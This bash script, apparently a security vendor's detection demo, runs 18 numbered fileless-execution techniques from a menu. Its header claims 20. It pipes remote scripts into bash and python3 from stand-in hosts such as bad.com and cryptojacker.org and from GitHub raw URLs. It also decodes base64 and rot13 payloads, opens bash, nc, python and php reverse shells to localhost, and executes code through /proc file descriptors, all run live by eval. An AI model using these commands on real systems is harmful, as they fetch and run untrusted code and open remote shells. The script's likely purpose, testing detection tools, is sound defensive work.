#!/usr/bin/env bash
# ============================================================
#  fileless-execution-demo.sh
#  Purpose : Show 20 different fileless attacks (categorized)
#  Author  : Lior Boehm   –  Upwind Security demo
# ============================================================
set -euo pipefail

# Colors
BOLD="\e[1m"
CYAN="\e[36m"
GREEN="\e[32m"
YELLOW="\e[33m"
RESET="\e[0m"

# Banner
clear
command -v figlet >/dev/null && figlet "upwind.io" || echo -e "\nUPWIND.IO"
echo -e "${CYAN}${BOLD}Fileless Execution Demonstration  –  Lior Boehm${RESET}\n"

# Config
LHOST="127.0.0.1"
LPORT1="4444"
LPORT2="5555"
LPORT3="9001"

# Categorized commands
declare -A categories

categories[Downloaders]="
# 1
curl -s http://example.com/script.sh | bash
# 2
exec 3< <(curl -s http://bad.com/payload.sh); bash /proc/self/fd/3
# 3
X=\$(curl -s http://cryptojacker.org/liorpayload.py); python3 -c \"\$X\"
# 4
bash -c \"\$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh)\"
"

categories[Encoding]="
# 5
echo 'ZXhlYyAiQjY0IHBheWxvYWQgc3VjY2VzcyIK' | base64 -d | bash
# 6
bash -c \"\$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/b64.txt | base64 -d)\"
# 7
bash -c \"\$(echo 'ENFUGBYY' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 -d)\"
# 8
exec 8< <(openssl enc -d -base64 <<< L2Jpbi9zaCAtYyBlY2hvIGhlbGxv); bash /proc/self/fd/8
"

categories[ReverseShells]="
# 9
timeout 2s bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT1} 0>&1' &
# 10
timeout 2s nc -e /bin/sh ${LHOST} ${LPORT1} &
# 11
timeout 2s python3 -c 'import os,pty,socket; s=socket.socket(); s.connect((\"${LHOST}\",${LPORT2})); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")' &
# 12
timeout 2s php -r '$s=fsockopen(\"${LHOST}\",7777);exec(\"/bin/sh -i <&3 >&3 2>&3\");' &
# 13
timeout 2s bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT3} 0>&1' &
"

categories[AdvancedFD]="
# 14
exec 3< <(echo 'hs.doaolyp/moc.dab//:ptth' | rev | xargs curl -s); bash /proc/self/fd/3
# 15
exec 3< /bin/bash; /proc/self/fd/3 -c 'echo executed FD shell'
# 16
exec {FD}<>/dev/tcp/${LHOST}/9898; echo whoami >&\$FD; cat <&\$FD &
# 17
exec 9< <(dd if=/dev/zero bs=0 count=0 | curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/shell.sh); bash /proc/self/fd/9
# 18
python3 - <<'PY'
import urllib.request; print('[*] Inline Python payload executed (test.py)')
exec(urllib.request.urlopen("https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/test.py").read().decode())
PY
"

print_menu() {
  echo -e "${YELLOW}${BOLD}\n=========== MAIN MENU ===========${RESET}"
  echo "  1) Downloaders"
  echo "  2) Encoding"
  echo "  3) ReverseShells"
  echo "  4) AdvancedFD"
  echo "  a) Run ALL attacks"
  echo "  q) Quit"
}

run_category() {
  local cat=$1
  echo -e "\n${GREEN}[*] Running category: $cat${RESET}"
  local IFS=$'\n'
  local cmds=( $(echo -e "${categories[$cat]}" | grep -v '^#' | sed '/^$/d') )
  for cmd in "${cmds[@]}"; do
    echo -e "\n${CYAN}[>] $cmd${RESET}"
    (eval "$cmd") &
  done
}

while true; do
  print_menu
  read -rp $'\nChoose category: ' choice
  case "$choice" in
    1) run_category Downloaders ;;
    2) run_category Encoding ;;
    3) run_category ReverseShells ;;
    4) run_category AdvancedFD ;;
    [Aa])
      for cat in "${!categories[@]}"; do
        run_category "$cat"
      done
      ;;
    [Qq]) echo -e "${BOLD}Exiting.${RESET}"; exit 0 ;;
    *) echo "Invalid choice" ;;
  esac
done
